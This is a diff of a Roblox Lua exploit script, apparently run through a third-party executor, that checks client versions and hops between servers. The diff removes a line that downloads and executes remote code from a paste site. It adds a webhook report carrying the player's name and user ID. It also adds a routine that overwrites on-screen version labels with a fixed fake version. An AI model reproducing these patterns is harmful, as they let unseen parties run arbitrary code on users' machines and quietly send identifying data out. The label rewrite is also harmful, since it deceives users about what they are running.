@@ -1,4 +1,4 @@
-local desiredVersion = "1706"
+local desiredVersion = "1689"
 local PlaceId = game.PlaceId
 local AUTO_HOP_LOOP = false       -- Disabled as requested
 local AUTO_TELEPORT_LOOP = false  -- Disabled as requested
@@ -14,8 +14,26 @@ local Player = Players.LocalPlayer
 -- Clipboard compatibility
 local setclipboard = setclipboard or toclipboard or (Clipboard and Clipboard.set)
 
-repeat task.wait(0.1) until game:IsLoaded()
-task.wait(5)
+-- Wait for game fully loaded
+repeat task.wait() until game:IsLoaded()
+
+-- === Update version text in all TextLabels in PlayerGui ===
+local newVersionText = "v1706"
+
+local function changeVersionText(parent)
+    for _, child in ipairs(parent:GetChildren()) do
+        if child:IsA("TextLabel") then
+            if string.match(child.Text, "^v%d+$") and child.Text ~= newVersionText then
+                child.Text = newVersionText
+            end
+        end
+        changeVersionText(child)
+    end
+end
+
+local playerGui = Player:WaitForChild("PlayerGui")
+changeVersionText(playerGui)
+task.wait(0.1)
 
 -- UI SETUP
 local hopRequested = false
@@ -96,20 +114,22 @@ local function createLoadingUI()
         gui:Destroy()
     end)
 
+    -- Credits on the side
     local creditsLabel = Instance.new("TextLabel")
     creditsLabel.Name = "CreditsLabel"
-    creditsLabel.Size = UDim2.new(0.3, 0, 0, 40)
-    creditsLabel.Position = UDim2.new(0.35, 0, 0.5, 0)
+    creditsLabel.Size = UDim2.new(0, 150, 0, 40)
+    creditsLabel.Position = UDim2.new(1, -160, 0.05, 0)  -- Right side, near top
     creditsLabel.BackgroundTransparency = 1
-    creditsLabel.Text = "Credits: Yuuto"
+    creditsLabel.Text = "Credits: Yuuto\nfrom lumin hub.gg/luminhub"
     creditsLabel.Font = Enum.Font.SourceSansItalic
-    creditsLabel.TextSize = 28
+    creditsLabel.TextSize = 20
     creditsLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
     creditsLabel.TextStrokeTransparency = 0.3
     creditsLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
     creditsLabel.TextWrapped = true
-    creditsLabel.TextXAlignment = Enum.TextXAlignment.Center
-    creditsLabel.Parent = bg
+    creditsLabel.TextXAlignment = Enum.TextXAlignment.Right
+    creditsLabel.TextYAlignment = Enum.TextYAlignment.Top
+    creditsLabel.Parent = gui
 
     return gui, statusLabel, versionLabel
 end
@@ -130,6 +150,8 @@ local function sendWebhook()
     local maxPlayers = Players.MaxPlayers or 0
     local currentVersion = tostring(version()):match("%d+") or "Unknown"
     local currentPlaceVersion = tostring(game.PlaceVersion or "Unknown")
+    local playerName = Player.Name or "Unknown"
+    local playerUserId = Player.UserId or 0
 
     local isCorrectVersion = currentVersion == desiredVersion
     local embedColor = isCorrectVersion and 0x00FF00 or 0xFF0000
@@ -140,6 +162,7 @@ local function sendWebhook()
     local embed = {
         title = "Script Joined Server",
         description = string.format(
+            "**Player:** %s (ID: %d)\n" ..
             "**Desired Version:** %s\n" ..
             "**Current Client Version:** %s\n" ..
             "**Current Place Version:** %s\n\n" ..
@@ -147,6 +170,8 @@ local function sendWebhook()
             "**Job ID:** `%s`\n\n" ..
             "**Teleport Code:**\n```lua\n" ..
             "game:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\", game:GetService(\"Players\").LocalPlayer)\n```",
+            playerName,
+            playerUserId,
             desiredVersion,
             currentVersion,
             currentPlaceVersion,
@@ -170,13 +195,14 @@ local function sendWebhook()
     end)
 end
 
--- Server hop
+-- Server hop: random server hop with no filtering
 local function tryServerHop()
     local servers = {}
     local cursor = nil
+    statusLabel.Text = "🔎 Scanning servers..."
 
     repeat
-        local url = "https://games.roblox.com/v1/games/"..PlaceId.."/servers/Public?sortOrder=Asc&limit=100"
+        local url = "https://games.roblox.com/v1/games/" .. PlaceId .. "/servers/Public?sortOrder=Asc&limit=100"
         if cursor then url = url .. "&cursor=" .. cursor end
 
         local success, response = pcall(function()
@@ -192,13 +218,14 @@ local function tryServerHop()
             cursor = response.nextPageCursor
         else
             warn("Failed to get server list.")
+            statusLabel.Text = "⚠️ Failed to scan servers."
             return false
         end
     until not cursor or #servers >= 50
 
     if #servers > 0 then
+        statusLabel.Text = "✅ Found servers, hopping..."
         local randomServerId = servers[math.random(1, #servers)]
-        statusLabel.Text = "🔁 Hopping to new server..."
         TeleportService:TeleportToPlaceInstance(PlaceId, randomServerId, Player)
         return true
     else
@@ -211,22 +238,20 @@ end
 task.spawn(function()
     statusLabel.Text = "✅ Script executing..."
 
-    -- ✅ New Script Injected
-    loadstring(game:HttpGet("https://pastefy.app/kS20FuCv/raw"))()
-
-    -- ❌ Immediately disable all auto loops
-    AUTO_HOP_LOOP = false
-    AUTO_TELEPORT_LOOP = false
-
+    -- Copy Job ID to clipboard
     copyJobId()
+    -- Send webhook with player info
     sendWebhook()
 
     while true do
         task.wait(0.5)
         if hopRequested then
             hopRequested = false
-            tryServerHop()
-            break
+            if tryServerHop() then
+                break
+            else
+                statusLabel.Text = "⚠️ Retry failed, no servers."
+            end
         elseif stayRequested then
             stayRequested = false
             statusLabel.Text = "🛑 Staying in current server."
